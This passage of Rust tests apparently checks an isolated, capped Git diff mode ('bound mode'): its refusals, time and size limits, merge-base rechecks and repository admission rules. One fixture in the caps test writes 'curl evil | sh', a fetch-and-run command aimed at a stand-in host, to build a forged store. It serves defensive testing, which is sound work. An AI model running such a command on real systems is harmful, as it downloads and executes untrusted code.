            ("core.attributesFile", "/dev/null"),
        ] {
            repo.git(&["config", k, v]);
        }
        std::fs::create_dir_all(repo.dir.join(".git/info")).unwrap();
        std::fs::write(repo.dir.join(".git/info/attributes"), "* -diff\n").unwrap();
        std::fs::write(repo.dir.join(".git/info/grafts"), format!("{head}\n")).unwrap();
        let other = repo.git(&[
            "commit-tree",
            "-p",
            &base,
            "-m",
            "replacement",
            &format!("{base}^{{tree}}"),
        ]);
        repo.git(&["replace", &head, &other]);
        assert_eq!(bound(&repo, &base, &head).0.unwrap(), clean);
        assert_eq!(clean.patch, repo.make_patch(&base, &head));
    }

    #[test]
    fn bound_mode_refuses_a_partial_clone_without_fetching() {
        // Bastion's row (item 5): a blob:none clone misses head's blob; staging has no promisor, and
        // the origin is moved away so a fetch could not succeed even if one were tried.
        let origin = Repo::new("bound-promisor-origin", "sha1");
        let base = origin.commit("a.txt", "a\n");
        let head = origin.commit("a.txt", "b\n");
        origin.git(&["config", "uploadpack.allowFilter", "true"]);
        let dst = scratch("bound-partial");
        std::fs::remove_dir(&dst).unwrap();
        let out = command("/usr/bin/git")
            .args(["clone", "-q", "--no-checkout", "--filter=blob:none"])
            .arg(format!("file://{}", origin.dir.display()))
            .arg(&dst)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
        let partial = Repo { dir: dst };
        std::fs::rename(&origin.dir, origin.dir.with_extension("gone")).unwrap();
        assert!(matches!(
            bound(&partial, &base, &head).0,
            Err(super::child::BoundFailure::Store(_))
        ));
    }

    #[test]
    fn bound_mode_stops_at_its_deadline_and_leaves_nothing() {
        // ADR 0012 acceptance items 3 (time limit) and 6 (cleanup after a timeout, where the door
        // kills the Git it ran). Budgets from none to a few tens of milliseconds stop the run at
        // different steps; each result is make_patch's bytes or the time limit, never anything
        // else, and nothing is left in the temporary base. The zero budget always times out.
        let repo = Repo::new("bound-deadline", "sha1");
        let base = repo.commit("a.txt", "a\n");
        let head = repo.commit("a.txt", "b\n");
        let expected = repo.make_patch(&base, &head);
        let mut timeouts = 0;
        for millis in [0, 5, 20, 50] {
            let tmp = scratch("bound-tmp-deadline");
            let ran = super::child::bound_diff_in(
                &test_git(),
                &repo.objects(),
                &base,
                &head,
                &tmp,
                Duration::from_millis(millis),
                super::child::CAPS,
            );
            match &ran {
                Ok(made) => assert_eq!(made.patch, expected, "{millis} ms"),
                Err(super::child::BoundFailure::Unavailable(why)) if why.contains("time limit") => {
                    timeouts += 1;
                }
                Err(other) => panic!("{millis} ms: {other:?}"),
            }
            assert_eq!(
                std::fs::read_dir(&tmp).unwrap().count(),
                0,
                "{millis} ms: bound mode left files in its temporary base"
            );
        }
        assert!(timeouts >= 1, "the zero budget times out");
    }

    #[test]
    fn the_recheck_refuses_a_merge_base_the_verified_objects_do_not_give() {
        // ADR 0012 D3 step 4 and acceptance item 8 ("merge base taken from staging without the
        // recheck"): the true merge base passes; any other id is refused as a store problem.
        let repo = Repo::new("bound-recheck", "sha1");
        let root = repo.commit("a.txt", "0\n");
        let base = repo.commit("a.txt", "1\n");
        repo.git(&["checkout", "-q", "-b", "side", &root]);
        let head = repo.commit("b.txt", "2\n");
        let git_dir = repo.dir.join(".git");
        let tmp = scratch("bound-tmp-recheck");
        assert_eq!(
            super::child::recheck_in(&test_git(), &git_dir, &root, &base, &head, &tmp),
            Ok(())
        );
        for wrong in [&base, &head] {
            assert!(
                matches!(
                    super::child::recheck_in(&test_git(), &git_dir, wrong, &base, &head, &tmp),
                    Err(super::child::BoundFailure::VerifiedMergeBase(why)) if why.contains("is not the one its re-hashed objects give")
                ),
                "{wrong}"
            );
        }
    }

    #[test]
    fn bound_mode_equals_make_patch_on_twenty_generated_pairs_in_both_object_formats() {
        // ADR 0012 acceptance item 1 (ruling P1.3): byte equality on 20 named pairs of one generated
        // history, in a SHA-1 and a SHA-256 store. The history has every change shape make_patch.sh
        // writes: modify, add, non-ASCII name, binary, executable bit, symlink, delete, rename (as
        // delete and add: --no-renames), empty file, no final newline, a side branch and a merge.
        for format in ["sha1", "sha256"] {
            let repo = Repo::new(&format!("bound-pairs-{format}"), format);
            let commit = |message: &str| {
                repo.git(&["commit", "-q", "--allow-empty", "-m", message]);
                repo.git(&["rev-parse", "HEAD"])
            };
            let mut main = vec![repo.commit("a.txt", "one\ntwo\nthree\n")];
            main.push(repo.commit("dir/b.txt", "b\n"));
            main.push(repo.commit("caf\u{e9} \u{1f600}.txt", "accented\n"));
            main.push(repo.commit("bin.dat", "\0\x01\x02 binary \u{fffd}\n"));
            main.push(repo.commit("run.sh", "#!/bin/sh\necho run\n"));
            {
                use std::os::unix::fs::PermissionsExt as _;
                std::fs::set_permissions(
                    repo.dir.join("run.sh"),
                    std::fs::Permissions::from_mode(0o755),
                )
                .unwrap();
            }
            repo.git(&["add", "run.sh"]);
            main.push(commit("executable"));
            std::os::unix::fs::symlink("a.txt", repo.dir.join("link")).unwrap();
            repo.git(&["add", "link"]);
            main.push(commit("symlink"));
            repo.git(&["checkout", "-q", "-b", "side", main.get(3).unwrap()]);
            let side_a = repo.commit("side.txt", "side\n");
            let side_b = repo.commit("bin.dat", "\0\x03 other binary\n");
            repo.git(&["checkout", "-q", "main"]);
            repo.git(&["rm", "-q", "dir/b.txt"]);
            main.push(commit("delete"));
            repo.git(&["mv", "a.txt", "renamed.txt"]);
            main.push(commit("rename"));
            main.push(repo.commit("empty.txt", ""));
            main.push(repo.commit("tail.txt", "no final newline"));
            repo.git(&["merge", "-q", "--no-edit", "side"]);
            main.push(repo.git(&["rev-parse", "HEAD"]));
            main.push(repo.commit("renamed.txt", "one\n2\nthree\nfour\n"));
            let m = |i: usize| main.get(i).unwrap().as_str();
            let pairs = [
                (m(0), m(1)),
                (m(1), m(2)),
                (m(2), m(3)),
                (m(3), m(4)),
                (m(4), m(5)),
                (m(5), m(6)),
                (m(6), m(7)),
                (m(7), m(8)),
                (m(8), m(9)),
                (m(9), m(10)),
                (m(10), m(11)),
                (m(11), m(12)),
                (m(0), m(12)),
                (m(2), m(9)),
                (m(6), m(11)),
                (side_b.as_str(), m(12)),
                (m(9), side_b.as_str()),
                (side_a.as_str(), m(8)),
                (m(12), side_a.as_str()),
                (m(12), m(12)),
            ];
            assert_eq!(pairs.len(), 20);
            for (base, head) in pairs {
                let made = bound(&repo, base, head)
                    .0
                    .unwrap_or_else(|e| panic!("{format} {base} {head}: {e:?}"));
                assert_eq!(
                    made.merge_base,
                    repo.git(&["merge-base", base, head]),
                    "{format} {base} {head}"
                );
                assert_eq!(
                    made.patch,
                    repo.make_patch(base, head),
                    "{format} {base} {head}"
                );
            }
        }
    }

    #[test]
    #[ignore = "reads this repository's own history, which needs a plain clone (a worktree's .git is a file, refused by design); the PATCH-BOUND gate runs it with --ignored in its fresh clone"]
    fn bound_mode_equals_make_patch_on_this_repositorys_history() {
        // ADR 0012 acceptance item 1 (ruling P1.3): byte equality on real pairs of forge-warden's own
        // history: the last 20 first-parent steps, and the last 5 merges against their second parent.
        let repo = Repo {
            dir: PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../.."),
        };
        let line = repo.git(&["rev-list", "--first-parent", "-n", "21", "HEAD"]);
        let firsts: Vec<&str> = line.lines().collect();
        assert_eq!(firsts.len(), 21, "a clone with history");
        let mut pairs: Vec<(String, String)> = firsts
            .windows(2)
            .map(|w| {
                (
                    (*w.get(1).unwrap()).to_owned(),
                    (*w.first().unwrap()).to_owned(),
                )
            })
            .collect();
        let merges = repo.git(&["rev-list", "--merges", "-n", "5", "HEAD"]);
        for merge in merges.lines() {
            // The merged branch's tip against the merge (the merge base is that tip).
            let second = repo.git(&["rev-parse", &format!("{merge}^2")]);
            pairs.push((second, merge.to_owned()));
        }
        assert!(pairs.len() >= 20);
        for (base, head) in &pairs {
            let made = bound(&repo, base, head)
                .0
                .unwrap_or_else(|e| panic!("{base} {head}: {e:?}"));
            assert_eq!(made.patch, repo.make_patch(base, head), "{base} {head}");
        }
    }

    #[test]
    fn each_bound_mode_refusal_says_what_it_is() {
        // The messages users read for each variant (REFUSAL_MAP rows match the variant; this holds
        // the words).
        use super::child::{BoundFailure as B, RepositoryRefusal as R};
        for (failure, text) in [
            (
                B::Ids,
                "--base and --head must be full object ids of one length (40 or 64 lowercase hex digits)",
            ),
            (
                B::NotACommit {
                    name: "base",
                    id: "abc".to_owned(),
                },
                "base abc is not a commit in the repository",
            ),
            (B::NoCommonHistory, "base and head have no common history"),
            (
                B::SeveralMergeBases(3),
                "base and head have 3 merge bases; name the merge base as --base",
            ),
            (B::Store("s".to_owned()), "s"),
            (B::VerifiedMergeBase("v".to_owned()), "v"),
            (B::Unavailable("u".to_owned()), "u"),
            (
                B::Repository(R::Shallow),
                "--repo: it is a shallow repository: its history is incomplete",
            ),
            (B::Door(super::DoorError::environment("d".to_owned())), "d"),
        ] {
            assert_eq!(failure.to_string(), text);
        }
    }

    #[test]
    fn bound_mode_refuses_a_git_over_each_cap_and_leaves_nothing() {
        // ADR 0012 acceptance items 3 and 6, moved to step (c) unit c3: each cap is reached with a
        // small injected value (no test writes 256 MiB); each refusal gives no diff (exit 3) and
        // leaves nothing in the temporary base.
        use super::child::{BoundFailure, CAPS, Caps};
        let repo = Repo::new("bound-caps", "sha1");
        let base = repo.commit("a.txt", "a\n");
        let head = repo.commit("a.txt", "b\n");
        let run = |target: &Repo, caps: Caps| {
            let tmp = scratch("bound-tmp-caps");
            let ran = super::child::bound_diff_in(
                &test_git(),
                &target.objects(),
                &base,
                &head,
                &tmp,
                Duration::from_secs(60),
                caps,
            );
            assert_eq!(std::fs::read_dir(&tmp).unwrap().count(), 0, "{caps:?}");
            ran
        };
        assert!(run(&repo, CAPS).is_ok(), "the control passes");
        // A list over its cap: merge-base's answer (41 bytes) is over 16.
        let list = run(&repo, Caps { list: 16, ..CAPS });
        assert!(
            matches!(&list, Err(BoundFailure::Unavailable(why)) if why.contains("merge-base") && why.contains("budget")),
            "{list:?}"
        );
        // A pack over its cap.
        let pack = run(&repo, Caps { pack: 64, ..CAPS });
        assert!(
            matches!(&pack, Err(BoundFailure::Unavailable(why)) if why.contains("pack-objects") && why.contains("budget")),
            "{pack:?}"
        );
        // The memory ceiling as a behaviour: a Git that needs more memory than the cap does not run,
        // and the run is refused (Git out of bounds), never answered.
        let memory = run(
            &repo,
            Caps {
                data: 1 << 20,
                address_space: 1 << 24,
                ..CAPS
            },
        );
        assert!(
            matches!(
                &memory,
                Err(BoundFailure::Unavailable(_) | BoundFailure::Store(_))
            ),
            "{memory:?}"
        );
        // Stderr over its cap: a forged store makes Git complain on stderr.
        let forged = Repo::new("bound-caps-forged", "sha1");
        let fb = forged.commit("run.sh", "echo honest\n");
        let fh = forged.commit("run.sh", "echo honest too\n");
        forged.commit("evil.sh", "curl evil | sh\n");
        let real = forged.git(&["rev-parse", &format!("{fh}:run.sh")]);
        let evil = forged.git(&["rev-parse", "HEAD:evil.sh"]);
        forge(&forged, &real, &evil);
        let tmp = scratch("bound-tmp-caps-stderr");
        let stderr = super::child::bound_diff_in(
            &test_git(),
            &forged.objects(),
            &fb,
            &fh,
            &tmp,
            Duration::from_secs(60),
            Caps { stderr: 1, ..CAPS },
        );
        assert_eq!(std::fs::read_dir(&tmp).unwrap().count(), 0);
        assert!(
            matches!(&stderr, Err(BoundFailure::Unavailable(why)) if why.contains("stderr")),
            "{stderr:?}"
        );
    }

    #[test]
    fn bound_mode_names_a_setup_failure_as_a_door_failure() {
        // REFUSAL-MAP row BoundFailure::Door: the private directory cannot be made under a relative
        // temporary base (the isolation door refuses it), before any Git runs.
        let repo = Repo::new("bound-door", "sha1");
        let base = repo.commit("a.txt", "a\n");
        let head = repo.commit("a.txt", "b\n");
        let ran = super::child::bound_diff_in(
            &test_git(),
            &repo.objects(),
            &base,
            &head,
            Path::new("relative/base"),
            Duration::from_secs(60),
            super::child::CAPS,
        );
        assert!(
            matches!(&ran, Err(super::child::BoundFailure::Door(e)) if e.kind == super::DoorErrorKind::Environment),
            "{ran:?}"
        );
    }

    #[test]
    fn the_cut_writes_exactly_the_boundary_as_shallow() {
        // ADR 0012 D3.3 and plant bound-shallow-not-written: whether a missing shallow file refuses a
        // run depends on the Git build (Train B2, receipt b7797a70: the gate image's Git passed the
        // redundant-merge row without it). This holds the file itself.
        let dir = scratch("bound-cut");
        let (a, b) = ("1".repeat(40), "2".repeat(40));
        super::child::cut_in(&[a.clone(), b.clone()], &dir).unwrap();
        assert_eq!(
            std::fs::read_to_string(dir.join("shallow")).unwrap(),
            format!("{a}\n{b}\n")
        );
        let none = scratch("bound-cut-none");
        super::child::cut_in(&[], &none).unwrap();
        assert!(
            !none.join("shallow").exists(),
            "a root merge base leaves no boundary and no file"
        );
    }

    #[test]
    fn init_flags_are_pinned() {
        // ADR 0012 D3.1 and acceptance item 8 ("--template= removed"): a pinned shape, because the
        // template has no effect on the bytes in a cleared environment.
        assert_eq!(
            super::child::INIT_FLAGS,
            ["init", "--quiet", "--bare", "--template="]
        );
    }

    #[test]
    fn bound_mode_admits_only_a_plain_repository() {
        use super::child::{BoundFailure, RepositoryRefusal as R, admit_repository};
        let work = Repo::new("bound-admit-work", "sha1");
        work.commit("a.txt", "a\n");
        assert_eq!(
            admit_repository(&work.dir).unwrap(),
            work.dir.canonicalize().unwrap().join(".git/objects")
        );
        let bare = scratch("bound-admit-bare");
        assert!(
            command("/usr/bin/git")
                .args(["init", "-q", "--bare"])
                .arg(&bare)
                .status()
                .unwrap()
                .success()
        );
        assert_eq!(
            admit_repository(&bare).unwrap(),
            bare.canonicalize().unwrap().join("objects")
        );
        // Each refusal by its own variant (REFUSAL_MAP rows), and its message.
        let refused = |dir: &Path, variant: R, part: &str| {
            let failure = admit_repository(dir).unwrap_err();
            assert_eq!(failure, BoundFailure::Repository(variant), "{dir:?}");
            assert!(failure.to_string().contains(part), "{dir:?}: {failure}");
        };
        // A linked worktree: .git is a file.
        let linked = scratch("bound-admit-linked");
        std::fs::remove_dir(&linked).unwrap();
        work.git(&["worktree", "add", "-q", linked.to_str().unwrap()]);
        refused(&linked, R::GitFile, "git-common-dir");
        // A symlinked .git.
        let link = scratch("bound-admit-symlink");
        std::os::unix::fs::symlink(work.dir.join(".git"), link.join(".git")).unwrap();
        refused(&link, R::GitSymlink, "symlink");
        // A caller's alternates file and a caller's shallow file.
        let alt = Repo::new("bound-admit-alternates", "sha1");
        alt.commit("a.txt", "a\n");
        std::fs::write(
            alt.dir.join(".git/objects/info/alternates"),
            b"/elsewhere\n",
        )
        .unwrap();
        refused(&alt.dir, R::Alternates, "alternates");
        let http = Repo::new("bound-admit-http-alternates", "sha1");
        http.commit("a.txt", "a\n");
        std::fs::write(
            http.dir.join(".git/objects/info/http-alternates"),
            b"https://example.invalid/objects\n",
        )
        .unwrap();
        refused(&http.dir, R::Alternates, "http-alternates");
        // A symlinked objects directory.
        let linked_objects = Repo::new("bound-admit-objects-link", "sha1");
        linked_objects.commit("a.txt", "a\n");
        let moved = linked_objects.dir.join("objects-elsewhere");
        std::fs::rename(linked_objects.dir.join(".git/objects"), &moved).unwrap();
        std::os::unix::fs::symlink(&moved, linked_objects.dir.join(".git/objects")).unwrap();
        refused(&linked_objects.dir, R::ObjectsMissing, "objects directory");
        let shallow = Repo::new("bound-admit-shallow", "sha1");
        let id = shallow.commit("a.txt", "a\n");
        std::fs::write(shallow.dir.join(".git/shallow"), format!("{id}\n")).unwrap();
        refused(&shallow.dir, R::Shallow, "shallow");
        // A newline in the path: the alternates file is line-based (review M2).
        let parent = scratch("bound-admit-newline");
        let odd = parent.join("a\nb");
        std::fs::create_dir(&odd).unwrap();
        assert!(
            command("/usr/bin/git")
                .args(["init", "-q", "--bare"])
                .arg(&odd)
                .status()
                .unwrap()
                .success()
        );
        refused(&odd, R::PathCharacters, "control character");
        // A path that is not UTF-8.
        let raw = {
            use std::os::unix::ffi::OsStrExt as _;
            parent.join(std::ffi::OsStr::from_bytes(b"bad-\xff-name"))
        };
        std::fs::create_dir(&raw).unwrap();
        refused(&raw, R::NotUtf8, "not UTF-8");
        // Not a repository at all, and half a bare repository (objects without HEAD, HEAD without
        // objects): a bare repository needs both.
        refused(
            &scratch("bound-admit-empty"),
            R::NotARepository,
            "not a Git repository",
        );
        let objects_only = scratch("bound-admit-objects-only");
        std::fs::create_dir(objects_only.join("objects")).unwrap();
        refused(&objects_only, R::NotARepository, "not a Git repository");
        let head_only = scratch("bound-admit-head-only");
        std::fs::write(head_only.join("HEAD"), b"ref: refs/heads/main\n").unwrap();
        refused(&head_only, R::NotARepository, "not a Git repository");
    }
}

#[cfg(test)]
#[cfg(not(fw_fixture_cli))]
mod tests {
    use super::*;

    #[test]
    fn unix_seconds_map_to_utc_dates() {
        assert_eq!(
            date_of_unix_seconds(0).unwrap(),
            Date::new(1970, 1, 1).unwrap()
        );
        assert_eq!(
            date_of_unix_seconds(86_399).unwrap(),
            Date::new(1970, 1, 1).unwrap()
        );
        assert_eq!(
            date_of_unix_seconds(86_400).unwrap(),
            Date::new(1970, 1, 2).unwrap()
        );
        // 2026-11-05T12:00:00Z
        assert_eq!(
            date_of_unix_seconds(1_793_880_000).unwrap(),
            Date::new(2026, 11, 5).unwrap()
        );
    }
}
